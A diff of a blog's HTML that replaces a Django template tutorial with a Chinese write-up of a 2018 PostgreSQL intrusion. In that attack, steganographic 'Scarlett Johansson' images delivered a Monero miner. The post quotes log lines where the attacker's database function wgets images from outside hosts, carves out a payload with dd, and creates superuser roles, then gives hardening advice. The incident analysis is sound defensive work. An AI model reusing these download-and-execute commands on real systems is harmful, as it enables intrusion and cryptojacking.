@@ -4,7 +4,7 @@
     <!-- Title -->
     
     <title>
-         Django 学习笔记2-- Templates  | LexusLee&#39;s Blog
+        记一次 postgresql 斯嘉丽约翰逊攻击的排查 | LexusLee&#39;s Blog
     </title>
     
     <!-- Favicons -->
@@ -40,7 +40,7 @@
     <!-- The Open Graph protocol -->
     <meta property="og:url" content="http://lexuslee.me">
     <meta property="og:type" content="blog">
-    <meta property="og:title" content=" Django 学习笔记2-- Templates  | LexusLee&#39;s Blog">
+    <meta property="og:title" content="记一次 postgresql 斯嘉丽约翰逊攻击的排查 | LexusLee&#39;s Blog">
     <meta property="og:description" content="Be the change you want to see in the world.">
     
      <!--[if lte IE 9]>
@@ -210,7 +210,7 @@
 	<ul class="post-toc-wrap mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect"
 		for="post-toc-trigger-btn">
 			
-			<ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#流模板基础"><span class="post-toc-number">1.</span> <span class="post-toc-text">流模板基础</span></a></li></ol>
+			<ol class="post-toc"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#背景"><span class="post-toc-number">1.</span> <span class="post-toc-text">背景</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#排查"><span class="post-toc-number">2.</span> <span class="post-toc-text">排查</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#反思"><span class="post-toc-number">3.</span> <span class="post-toc-text">反思</span></a></li></ol>
 		
 <!--			<li class="mdl-menu__item">Some Action</li>-->
 	</ul>
@@ -228,22 +228,11 @@
                 
 	<!-- Paradox Post Header -->
 	
-		
-			<!-- Random Thumbnail -->
-			<div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
-				<script>
-    
-    var randomNum;
-    randomNum = Math.floor(Math.random() * 5 + 1);
-    
-    $(".post_thumbnail-random").css('background-image', 'url(' + '/img/random/' + randomNum + '.png' + ')');
-    
-</script>
-
-		
+		<!-- Custom Thumbnail -->
+		<div class="post_thumbnail-custom mdl-card__media mdl-color-text--grey-50" style="background-image:url(http://image.knowing.asia/53d15464-67d2-4225-b98e-91bbdd132af7/72d33b84950ef1a25d3a74f60ab83873.png)">
 	
         <p class="article-headline-p">
-             Django 学习笔记2-- Templates 
+            记一次 postgresql 斯嘉丽约翰逊攻击的排查
         </p>
     </div>
 
@@ -261,7 +250,7 @@
     <!-- Author Name & Date -->
     <div>
         <strong>LexusLee</strong>
-        <span>Nov 16, 2015</span>
+        <span>Aug 11, 2018</span>
     </div>
     
     <div class="section-spacer"></div>
@@ -281,7 +270,7 @@
     </button>
     <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-viewtags-button">
         <li class="mdl-menu__item">
-        
+        <a class="post_tag-link" href="/tags/Linux/">Linux</a>
     </ul>
     
     <!-- Share -->
@@ -296,21 +285,21 @@
     
     
     <!-- Share Twitter -->
-    <a class="post_share-link" href="https://twitter.com/intent/tweet?text= Django 学习笔记2-- Templates &url=http://lexuslee.me//2015/11/16/2015-11-16-django-learning2/index.html&via=LexusLee" target="_blank">
+    <a class="post_share-link" href="https://twitter.com/intent/tweet?text=记一次 postgresql 斯嘉丽约翰逊攻击的排查&url=http://lexuslee.me//2018/08/11/2018-08-11-scarlett-johansson-sql-attack/index.html&via=LexusLee" target="_blank">
         <li class="mdl-menu__item">
             Share to Twitter
         </li>
     </a>
     
     <!-- Share Google+ -->
-    <a class="post_share-link" href="https://plus.google.com/share?url=http://lexuslee.me//2015/11/16/2015-11-16-django-learning2/index.html" target="_blank">
+    <a class="post_share-link" href="https://plus.google.com/share?url=http://lexuslee.me//2018/08/11/2018-08-11-scarlett-johansson-sql-attack/index.html" target="_blank">
         <li class="mdl-menu__item">
             Share to Google+
         </li>
     </a>
     
     <!-- Share Weibo -->
-    <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title= Django 学习笔记2-- Templates &url=http://lexuslee.me//2015/11/16/2015-11-16-django-learning2/index.html&pic=&searchPic=false&style=simple" target="_blank">
+    <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=记一次 postgresql 斯嘉丽约翰逊攻击的排查&url=http://lexuslee.me//2018/08/11/2018-08-11-scarlett-johansson-sql-attack/index.html&pic=&searchPic=false&style=simple" target="_blank">
         <li class="mdl-menu__item">
             Share to Weibo
         </li>
@@ -322,15 +311,40 @@
                 <!-- Post Content -->
                 <div id="post-content" class="markdown-Github mdl-color-text--grey-700 mdl-card__supporting-text fade out">
 	
-		<p>虽然 Django 中 Html 可以直接硬编码到 Python 中，但是这种行为并不利于前端开发人员进行维护。所以 Django 有了<a href="http://liquidmarkup.org/" target="_blank" rel="external">流模板</a> ( Liquid Templates )。</p>
-<h2 id="流模板基础"><a href="#流模板基础" class="headerlink" title="流模板基础"></a>流模板基础</h2><p>举个例子，下面这个模板大致含括了 Django 模板的几个特性。<br><a id="more"></a></p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">&#123;% raw %&#125;</div><div class="line">&#123;% load staticfiles %&#125;</div><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>&#123;% block title %&#125;&#123;% endblock %&#125;<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Dear &#123;&#123; person_name &#125;&#125;,<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line"></div><div class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Thanks for placing an order from &#123;&#123; company &#125;&#125;. It's scheduled to ship on &#123;&#123; ship_date|date:"F J,Y " &#125;&#125;.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line"></div><div class="line">    &#123;% if ordered_warranty %&#125;</div><div class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Your warranty information will be included in the packaging.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Here are the items you've ordered: <span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line"></div><div class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></div><div class="line">    &#123;% for item in item_list %&#125;</div><div class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span></div><div class="line">            &#123;&#123; item &#125;&#125;</div><div class="line">        <span class="tag">&lt;/<span class="name">li</span>&gt;</span></div><div class="line">    &#123;% endfor %&#125;</div><div class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></div><div class="line">    &#123;% else %&#125;</div><div class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>You didnt order a warranty, so you're on your own when the products inevitably stop working. <span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line">    &#123;% endif %&#125;</div><div class="line"></div><div class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Sincerely,<span class="tag">&lt;<span class="name">br</span> /&gt;</span>&#123;&#123; company &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>footer<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line">    &#123;% block footer %&#125;</div><div class="line">    <span class="tag">&lt;<span class="name">hr</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Thanks for visiting my site.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line">    &#123;% endblock %&#125;</div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div><div class="line">&#123;% endraw %&#125;</div></pre></td></tr></table></figure>
-<p>看出，模板是基于 Html 的，事实上它就是保存成一个 .html 文件，它跟我们所看到的 html 的区别就在于多了一些由 <figure class="highlight plain"><figcaption><span>raw %&#125;&#123;&#123; &#125;&#125;&#123;% endraw %&#125;```括起来的变量以及由```&#123;% raw %&#125;&#123;% %&#125;&#123;% endraw %&#125;```括起来的模板标签，此外变量还通过过滤器 ```|```来对文本输出格式进行转换。而这里 ```&#123;% raw %&#125;&#123;&#123; &#125;&#125;&#123;% endraw %&#125;``` 里的变量相当于一个形参，真正显示出来的是在我们渲染模板的 Python 文件里所传给它的值。</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">比如在下面的模板渲染代码里</div><div class="line"></div><div class="line">```python</div><div class="line">c = Context(&#123;&apos;person_name&apos;:&apos;LexusLee&apos;,</div><div class="line">			&apos;company&apos;: &apos;UESTC&apos;,</div><div class="line">			&apos;ship_date&apos;:datetime.date(2015,09,24),</div><div class="line">			&apos;ordered_warranty&apos;: False&#125;)</div></pre></td></tr></table></figure></p>
-<p>那么模板中的 <figure class="highlight plain"><figcaption><span>最终显示的就是 ```LexusLee``` 。</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">## 模板标签 </div><div class="line"></div><div class="line">1. ```&#123;% raw %&#125;&#123;% if variable %&#125; &#123;% else %&#125; &#123;% endif %&#125;&#123;% endraw %&#125;```用于判断变量 variable 是否为真，为真则执行 else 标签前的内容，否则执行 else 便签内的内容，跟大部分编程语言中的条件语句用法一致。</div><div class="line">2. 同理```&#123;% raw %&#125;&#123;% for %&#125; &#123;% endfor %&#125;&#123;% endraw %&#125;```的用法也和大部分编程语言中循环语句的用法一致。需要注意的是，每个 for 循环中还有一个成为```&#123;% raw %&#125;&#123;% forloop %&#125;&#123;% endraw %&#125;```的模板变量，这个变量能提示一些循环进度信息相关的属性，关于这个变量的详细统发可以参照[这一节](http://djangobook.py3k.cn/appendixF/)。</div><div class="line">3. ```&#123;% raw %&#125;&#123;% block content %&#125; &#123;% endblock %&#125;&#123;% endraw %&#125;```是用来处理[模板继承](http://djangobook.py3k.cn/appendixF/)和重载的标签，来避免重复和冗余的代码。比如上述的实例模板( base.html )中，我希望在多个文件中都能显示 footer ，而不需要重复编码，故在该模板中写了```&#123;% raw %&#125;&#123;% block footer %&#125;&#123;% endraw %&#125;```,而在另一个文件中只需要写 </div><div class="line">``` html</div><div class="line">&#123;% raw %&#125;</div><div class="line">&#123;% extends &quot;base.html&quot; %&#125;</div><div class="line">&#123;% block footer %&#125;</div><div class="line">&lt;a href=&quot;https://github.com/thehackercat&quot;&gt;Github&lt;/a&gt;</div><div class="line">&#123;% endblock %&#125;</div><div class="line">&#123;% endraw %&#125;</div></pre></td></tr></table></figure></p>
-<p>这样所有的 footer 中都会有<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"https://github.com/thehackercat"</span>&gt;</span>Github<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div></pre></td></tr></table></figure></p>
-<p>这行代码。而之前<code>{% block footer %} {% endblock %}</code>框中的代码将会被 overwrite ，也就是说<strong>对于重载模块，子模板可以重载这些部分，如果子模板不重载这些部分，则会按照默认的内容显示</strong>。</p>
-<p>4.<code>{% load staticfiles %}</code>用来加载静态资源，比如加载 CSS 、 JS 等静态文件时会用到。</p>
-<p>5.<code>{# #}</code> 用于注释。</p>
+		<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>今天下午连续收到了腾讯云 CPU overload 报警</p>
+<p><img src="http://7xse6j.com1.z0.glb.clouddn.com/CPU%20Overload.png" alt="CPU Usage"></p>
+<p>登服务器一看, 有个 postgres 账户跑的进程把 CPU 占满了，进程名特别奇怪。</p>
+<p><img src="http://7xse6j.com1.z0.glb.clouddn.com/htopinfo.png" alt="Htop info"></p>
+<a id="more"></a>
+<h3 id="排查"><a href="#排查" class="headerlink" title="排查"></a>排查</h3><p>于是根据 pid 到 <code>/proc/20619/stack</code> 下看到有一长串的 <code>[&lt;ffffffff81841ff2&gt;] entry_SYSCALL_64_fastpath+0x16/0x71</code> ，似乎短时间里发起大量的系统调用(prepare)并且还在不断增长。</p>
+<p>接着 <code>cat /proc/20619/cmdline</code> 发现执行的是 <code>/var/lib/postgresql/9.5/main/Ac2p018-0</code> 这个坏家伙，查看发现这是个二进制文件，看不出问题，猜测和 postgresql 数据库有关，看起来不像是什么数据库维护脚本，第一反应是被数据库攻击了，于是查看 <code>/var/lib/postgresql/.bash_history</code> 和 <code>/var/lib/postgresql/.psql_history</code> 发现一条记录都没，显然是被手动清空了，更加确定是被 hack 了。担心已经被拿到 root 权限了，于是通过 <code>lastlog</code> 和 <code>last</code> 查看登录状态，所幸之前的 root 账户的 ip 都是我自己的，只有 postgres 这个账户看起来异常。</p>
+<p>接着到 <code>/var/lib/postgresql/9.5/main/pg_log</code> 下查看数据库日志，抓到了几个奇怪的地方：</p>
+<ol>
+<li>有一个长连接持续从 <code>http://aluka.info/x6</code> 下载文件，</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div></pre></td><td class="code"><pre><div class="line">5144 --2018-08-11 15:47:30--  http://aluka.info/x6</div><div class="line">5145 Resolving aluka.info (aluka.info)... 103.27.110.206</div><div class="line">5146 Connecting to aluka.info (aluka.info)|103.27.110.206|:80... connected.</div><div class="line">5147 HTTP request sent, awaiting response... 200 OK</div><div class="line">5148 Length: 2758655 (2.6M)</div><div class="line">5149 Saving to: ‘xmm’</div><div class="line">5150</div><div class="line">5151      0K .......... .......... .......... .......... ..........  1%  399K 7s</div><div class="line">5152     50K .......... .......... .......... .......... ..........  3%  601K 5s</div><div class="line">5153    100K .......... .......... .......... .......... ..........  5%  592K 5s</div><div class="line">5154    150K .......... .......... .......... .......... ..........  7% 1.69M 4s</div><div class="line">5155    200K .......... .......... .......... .......... ..........  9%  754K 4s</div><div class="line">5156    250K .......... .......... .......... .......... .......... 11%  422K 4s</div><div class="line">5157    300K .......... .......... .......... .......... .......... 12%  405K 4s</div><div class="line">5158    350K .......... .......... .......... .......... .......... 14%  179K 5s</div><div class="line">5159    400K .......... .......... .......... .......... .......... 16% 81.1K 8s</div><div class="line">5160    450K .......... .......... .......... .......... .......... 18% 35.1K 13s</div><div class="line">5161    500K .......... .......... .......... .......... .......... 20%  117K 13s</div><div class="line">5162    550K .......... .......... .......... .......... .......... 22% 86.3K 14s</div><div class="line">5163    600K .......... .......... .......... .......... .......... 24%  122K 14s</div><div class="line">5164    650K .......... .......... .......... .......... .......... 25%  169K 13s</div><div class="line">5165    700K .......... .......... .......... .......... .......... 27%  171K 13s</div><div class="line">5166    750K .......... .......... .......... .......... .......... 29% 93.8K 13s</div><div class="line">5167    800K .......... .......... .......... .......... .......... 31% 94.9K 13s</div><div class="line">5168    850K .......... .......... .......... .......... .......... 33%  101K 13s</div><div class="line">5169    900K .......... .......... .......... .......... .......... 35% 53.6K 14s</div><div class="line">5170    950K .......... .......... .......... .......... .......... 37% 94.3K 14s</div><div class="line">5171   1000K .......... .......... .......... .......... .......... 38% 77.0K 13s</div><div class="line">5172   1050K .......... .......... .......... .......... .......... 40% 73.6K 13s</div><div class="line">5173   1100K .......... .......... .......... .......... .......... 42% 97.2K 13s</div><div class="line">5174   1150K .......... .......... .......... .......... .......... 44%  130K 13s</div><div class="line">5175   1200K .......... .......... .......... .......... .......... 46%  194K 12s</div><div class="line">5176   1250K .......... .......... .......... .......... .......... 48%  173K 12s</div><div class="line">5177   1300K .......... .......... .......... .......... .......... 50%  109K 11s</div><div class="line">5178   1350K .......... .......... .......... .......... .......... 51% 82.9K 11s</div><div class="line">5179   1400K .......... .......... .......... .......... .......... 53%  134K 10s</div><div class="line">5180   1450K .......... .......... .......... .......... .......... 55%  106K 10s</div><div class="line">5181   1500K .......... .......... .......... .......... .......... 57%  188K 10s</div><div class="line">5182   1550K .......... .......... .......... .......... .......... 59% 51.4K 9s</div><div class="line">5183   1600K .......... .......... .......... .......... .......... 61% 54.6K 9s</div><div class="line">5184   1650K .......... .......... .......... .......... .......... 63% 86.8K 9s</div><div class="line">5185   1700K .......... .......... .......... .......... .......... 64%  160K 8s</div><div class="line">5186   1750K .......... .......... .......... .......... .......... 66% 97.9K 8s</div><div class="line">5187   1800K .......... .......... .......... .......... .......... 68%  153K 8s</div><div class="line">5188   1850K .......... .......... .......... .......... .......... 70%  127K 7s</div><div class="line">5189   1900K .......... .......... .......... .......... .......... 72%  117K 7s</div><div class="line">5190   1950K .......... .......... .......... .......... .......... 74% 63.8K 6s</div><div class="line">5191   2000K .......... .......... .......... .......... .......... 76%  119K 6s</div><div class="line">5192   2050K .......... .......... .......... .......... .......... 77% 67.1K 5s</div><div class="line">5193   2100K .......... .......... .......... .......... .......... 79% 98.0K 5s</div><div class="line">5194   2150K .......... .......... .......... .......... .......... 81%  127K 5s</div><div class="line">5195   2200K .......... .......... .......... .......... .......... 83%  105K 4s</div><div class="line">5196   2250K .......... .......... .......... .......... .......... 85% 99.6K 4s</div><div class="line">5197   2300K .......... .......... .......... .......... .......... 87% 76.9K 3s</div><div class="line">5198   2350K .......... .......... .......... .......... .......... 89%  162K 3s</div><div class="line">5199   2400K .......... .......... .......... .......... .......... 90%  153K 2s</div><div class="line">5200   2450K .......... .......... .......... .......... .......... 92%  239K 2s</div><div class="line">5201   2500K .......... .......... .......... .......... .......... 94%  160K 1s</div><div class="line">5202   2550K .......... .......... .......... .......... .......... 96%  191K 1s</div><div class="line">5203   2600K .......... .......... .......... .......... .......... 98%  118K 0s</div><div class="line">5204   2650K .......... .......... .......... .......... ...       100% 82.4K=24s</div><div class="line">5205</div><div class="line">5206 2018-08-11 15:47:54 (111 KB/s) - ‘xmm’ saved [2758655/2758655]</div><div class="line">5207</div></pre></td></tr></table></figure>
+<ol>
+<li>发现更早的日志里，有两个连接从 <code>img1.imagehousing.com</code> 下载了两张图片, 并成功设置了 777 权限</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line">23 Resolving img1.imagehousing.com (img1.imagehousing.com)... 104.27.180.36, 104.27.181.36, 2400:cb00:2048:1::681b:b524, ...</div><div class="line">24 Connecting to img1.imagehousing.com (img1.imagehousing.com)|104.27.180.36|:80... connected.</div><div class="line">25 HTTP request sent, awaiting response... 200 OK</div><div class="line">26 Length: 1571 (1.5K) [image/png]</div><div class="line">27 Saving to: ‘./conf1.dat’</div><div class="line">28</div><div class="line">29      0K .                                                     100%  368M=0s</div><div class="line">30</div><div class="line">31 2018-08-05 12:54:26 (368 MB/s) - ‘./conf1.dat’ saved [1571/1571]</div><div class="line">32</div><div class="line">33 896+0 records in</div><div class="line">34 896+0 records out</div><div class="line">35 896 bytes copied, 0.000933778 s, 960 kB/s</div><div class="line">36 chmod: cannot access &apos;./x4064410502&apos;: No such file or directory</div><div class="line">37 2018-08-05 12:54:26 CST [24806-14] pgsql@postgres LOG:  duration: 810.107 ms  statement: select fun6404402637 (&apos;wget  -c  http://img1.imagehousing.com/0/baby-942650.png -O ./conf1.dat;dd  skip=675  bs=1  if=./conf1.dat  of=config.json  ;rm -f ./conf1#</div><div class="line">38 --2018-08-05 12:54:27--  http://img1.imagehousing.com/0/cat-497532.png</div><div class="line">39 Resolving img1.imagehousing.com (img1.imagehousing.com)... 104.27.180.36, 104.27.181.36, 2400:cb00:2048:1::681b:b424, ...</div><div class="line">40 Connecting to img1.imagehousing.com (img1.imagehousing.com)|104.27.180.36|:80... connected.</div><div class="line">41 HTTP request sent, awaiting response... 200 OK</div><div class="line">42 Length: 840464 (821K) [image/png]</div><div class="line">43 Saving to: ‘ifzsvasg.jpg’</div><div class="line">44</div><div class="line">45      0K .......... .......... .......... .......... ..........  6% 81.3K 9s</div><div class="line">46     50K .......... .......... .......... .......... .......... 12%  153K 7s</div><div class="line">47    100K .......... .......... .......... .......... .......... 18% 86.2K 7s</div><div class="line">48    150K .......... .......... .......... .......... .......... 24%  635K 5s</div><div class="line">49    200K .......... .......... .......... .......... .......... 30%  138K 4s</div><div class="line">50    250K .......... .......... .......... .......... .......... 36%  139K 4s</div><div class="line">51    300K .......... .......... .......... .......... .......... 42%  146K 4s</div><div class="line">52    350K .......... .......... .......... .......... .......... 48%  176K 3s</div><div class="line">53    400K .......... .......... .......... .......... .......... 54%  194K 3s</div><div class="line">54    450K .......... .......... .......... .......... .......... 60%  189K 2s</div><div class="line">55    500K .......... .......... .......... .......... .......... 67%  179K 2s</div><div class="line">56    550K .......... .......... .......... .......... .......... 73%  178K 1s</div><div class="line">57    600K .......... .......... .......... .......... .......... 79%  187K 1s</div><div class="line">58    650K .......... .......... .......... .......... .......... 85%  191K 1s</div><div class="line">59    700K .......... .......... .......... .......... .......... 91%  132K 0s</div><div class="line">60    750K .......... .......... .......... .......... .......... 97%  202K 0s</div><div class="line">61    800K .......... ..........                                 100%  141K=5.3s</div><div class="line">62</div><div class="line">63 2018-08-05 12:54:33 (154 KB/s) - ‘ifzsvasg.jpg’ saved [840464/840464]</div><div class="line">...</div></pre></td></tr></table></figure>
+<p>不禁很好奇是怎么做到的，但是又不敢把这两张图片 scp 到本地，于是起了个静态文件 serve 看了下这两张图片表面上看起来竟然是斯嘉丽约翰逊的大头照(流口水!)</p>
+<p><img src="http://www.4hou.com/uploads/20180318/1521342249300199.png" alt="Scalet Jown"></p>
+<p>印象里面 jpg/jpeg 图片似乎有种隐写 payload 的方法，早年作为葫芦娃种子来传播，网上查到 metaspolit 的这个<a href="https://github.com/r00t-3xp10it/FakeImageExploiter" target="_blank" rel="external">组件</a>似乎可以实现。同时也找到了这个工具 <a href="https://github.com/abeluck/stegdetect" target="_blank" rel="external">strgdetext</a> 用来提取图片中的隐写数据，可惜提取出来后仍是一段看不懂二进制码，于是思路阻塞住了。</p>
+<p>想到既然需要提取 payload, 那么数据库日志里肯定也有相应代码来做这一步，于是重新翻了下日志，果不其然，发现了真正攻击的这一步在这儿</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">68 2018-08-05 12:54:34 CST [24806-15] pgsql@postgres LOG:  duration: 6705.657 ms  statement: select fun6404402637(&apos;wget  -c   http://img1.imagehousing.com/0/cat-497532.png -O ifzsvasg.jpg;dd  skip=20656  bs=1  if=./ifzsvasg.jpg  of=x4064410502;rm -f ./i#</div><div class="line">69 2018-08-05 12:54:34 CST [24845-1] postgres@postgres FATAL:  password authentication failed for user &quot;postgres&quot;</div><div class="line">70 2018-08-05 12:54:34 CST [24845-2] postgres@postgres DETAIL:  Connection matched pg_hba.conf line 101: &quot;host    all             all              0.0.0.0/0              md5&quot;</div><div class="line">71 2018-08-05 12:54:35 CST [24806-16] pgsql@postgres ERROR:  role &quot;login&quot; already exists</div><div class="line">72 2018-08-05 12:54:35 CST [24806-17] pgsql@postgres STATEMENT:  CREATE ROLE   LOGIN ENCRYPTED PASSWORD &apos;md51351dbb7fe95c1f277282bc842cb3d6b&apos; SUPERUSER CREATEDB CREATEROLE REPLICATION   VALID UNTIL &apos;infinity&apos;;</div><div class="line">73 2018-08-05 12:54:36 CST [24806-18] pgsql@postgres ERROR:  role &quot;login&quot; already exists</div><div class="line">74 2018-08-05 12:54:36 CST [24806-19] pgsql@postgres STATEMENT:  CREATE ROLE   LOGIN ENCRYPTED PASSWORD &apos;md51351dbb7fe95c1f277282bc842cb3d6b&apos; SUPERUSER CREATEDB CREATEROLE    VALID UNTIL &apos;infinity&apos;;</div><div class="line">75 2018-08-05 12:54:36 CST [24806-21] pgsql@postgres STATEMENT:  CREATE ROLE pgsql LOGIN ENCRYPTED PASSWORD &apos;md56413b16b3d0861a1d2538e8d5a5eb39c&apos;  SUPERUSER CREATEDB CREATEROLE    VALID UNTIL &apos;infinity&apos;;</div></pre></td></tr></table></figure>
+<p>通过 <code>select tmp_function(cmd)</code> 的方式 执行了 下载图片 – 提取 paylod – 设置权限 – 删除图片 – 通过 payload 里的自定义代码重建了 pgsql 数据库账户 – 拿到数据库 root 权限 这一套组合拳，漂亮！</p>
+<p>排查到问题之后，赶紧清空了相关文件和 dbuser，设置了 postgres superuser 本地连接的设置，禁掉了 superuser 网络连接, 翻了下斯嘉丽约翰逊的其他照片，终于长舒一口气。</p>
+<p>回想起来，看看是否有其他人也遇到了「斯嘉丽攻击」, 一查发现果然果然不只我一人中招，不过看了下 <a href="https://www.exploit-db.com/" target="_blank" rel="external">exploit db</a> 里还没记录这个漏洞，对比了下时间，似乎是18年初才兴起的。</p>
+<ul>
+<li><a href="https://xz.aliyun.com/t/2158" target="_blank" rel="external">通过Scarlett Johansson的照片令Postgre数据库开启门罗币挖矿之旅</a></li>
+<li><a href="http://www.btc112.com/Monero/21066.html" target="_blank" rel="external">斯嘉丽门罗币攻击</a></li>
+</ul>
+<h3 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h3><p>这次主要的原因是 postgres 配置权限时偷懒导致服务器变成挖矿僵尸。</p>
+<ol>
+<li>postgres <code>pg_hba.conf</code> 里的用户认证 method 应改成 md5 方式</li>
+<li>数据库 superuser 只配置只能 local 访问禁止远程访问</li>
+<li>腾讯云安全组里数据库端口 outbound 应尽量限制 ip 段</li>
+</ol>
 
 	
 	
@@ -375,21 +389,13 @@
     
     <!-- Prev Nav -->
     
-        <a href="/2015/11/20/2015-11-20-blog-with-liquid/" id="post_nav-newer" class="prev-content">
-            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
-                <i class="material-icons">arrow_back</i>
-            </button>
-            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-            Newer
-        </a>
-    
 
     <!-- Section Spacer -->
     <div class="section-spacer"></div>
 
     <!-- Next Nav -->
     
-        <a href="/2015/11/14/2015-11-14-django-learning1/" id="post_nav-older" class="next-content">
+        <a href="/2018/02/01/2018-01-18-Service-fallback/" id="post_nav-older" class="next-content">
             Older
             &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
             <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
